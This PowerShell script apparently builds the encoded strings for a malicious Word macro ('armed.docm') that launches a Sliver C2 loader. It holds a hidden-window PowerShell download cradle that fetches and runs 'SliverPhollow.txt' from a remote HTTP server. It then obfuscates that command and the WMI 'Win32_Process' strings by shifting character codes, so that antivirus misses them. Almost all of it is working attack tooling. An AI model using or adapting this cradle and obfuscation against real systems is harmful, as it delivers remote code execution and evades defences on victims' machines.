# Prepare SliverLoader and a http server to serve the powershell loader as txt file
# https://github.com/Cyb3rDudu/SliverLoader

$payload = "powershell -exec bypass -nop -w hidden -c iex(new-object net.webclient).downloadstring('http://192.168.45.182/SliverPhollow.txt')"
$payload
[string]$output = ""
$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 12
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}
# Win32 WMI Provider
$output
write-output ""
$payload = "winmgmts:"
[string]$output = ""
$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 12
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}
# Win32 Process.Create() method
# $output
$payload = "Win32_Process"
# $payload
[string]$output = ""
$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 12
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }

}
# planned word doc name, for heuristics check during runtime
# $output
$payload = "armed.docm"
$payload
[string]$output = ""
$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 12
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}
$output